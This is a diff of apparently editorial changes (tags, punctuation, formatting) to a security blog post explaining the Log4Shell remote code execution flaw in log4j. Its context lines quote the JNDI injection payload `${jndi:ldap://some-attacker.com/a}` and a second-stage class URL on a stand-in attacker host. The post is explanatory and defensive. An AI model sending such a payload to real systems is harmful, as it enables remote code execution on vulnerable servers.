@@ -5,6 +5,7 @@ slug: log4j-zero-day
 image: https://www.lunasec.io/docs/img/log4shell-logo.png
 date: 2021-12-19
 keywords: [log4shell, log4j, log4j2, rce, java, zero-day, security, data-security, data-breaches]
+tags: [zero-day, security, data-security, guides, log4shell]
 authors: [free, chris, forrest]
 ---
 <!--
@@ -25,14 +26,14 @@ authors: [free, chris, forrest]
 
 _Originally Posted @ December 9th & Last Updated @ December 19th, 3:37pm PST_
 
-**Fixing Log4Shell? See Our [Updated Mitigation Guide](https://www.lunasec.io/docs/blog/log4j-zero-day-mitigation-guide),
+**Fixing Log4Shell? See Our [Updated Mitigation Guide](https://www.lunasec.io/docs/blog/log4j-zero-day-mitigation-guide)
 including our automated scanning tool.**
 
 **Also read: Our analysis of [CVE-2021-45046](https://www.lunasec.io/docs/blog/log4j-zero-day-update-on-cve-2021-45046) (a second log4j vulnerability).**
 
 ## What is it?
 On Thursday, December 9th, a 0-day exploit in the
-popular Java logging library `log4j` (version 2) was discovered that results in Remote Code Execution (RCE), by
+popular Java logging library log4j (version 2) was discovered that results in Remote Code Execution (RCE), by
 logging a certain string.
 
 Given how ubiquitous this library is, the impact of the exploit (full server control), and how easy it is to exploit,
@@ -138,7 +139,7 @@ As per [this discussion on HackerNews](https://news.ycombinator.com/item?id=2950
 
 ### Exploit Requirements
 
-- A server with a vulnerable `log4j` version (listed above).
+- A server with a vulnerable log4j version (listed above).
 - An endpoint with any protocol (HTTP, TCP, etc), that allows an attacker to send the exploit string.
 - A log statement that logs out the string from that request.
 
@@ -203,7 +204,7 @@ The logs should include an error message indicating that a remote lookup was att
 
 1. Data from the User gets sent to the server (via any protocol).
 2. logs the data containing the malicious payload from the request `${jndi:ldap://some-attacker.com/a}`, where `some-attacker.com` is an attacker controlled server.
-3. The `log4j` vulnerability is triggered by this payload and the server makes a request to `some-attacker.com` via "[Java Naming and Directory Interface](https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf)" (JNDI).
+3. The log4j vulnerability is triggered by this payload and the server makes a request to `some-attacker.com` via "[Java Naming and Directory Interface](https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf)" (JNDI).
 4. This response contains a path to a remote Java class file (ex. `http://second-stage.some-attacker.com/Exploit.class`), which is injected into the server process.
 5. This injected payload triggers a second stage, and allows an attacker to execute arbitrary code.
 
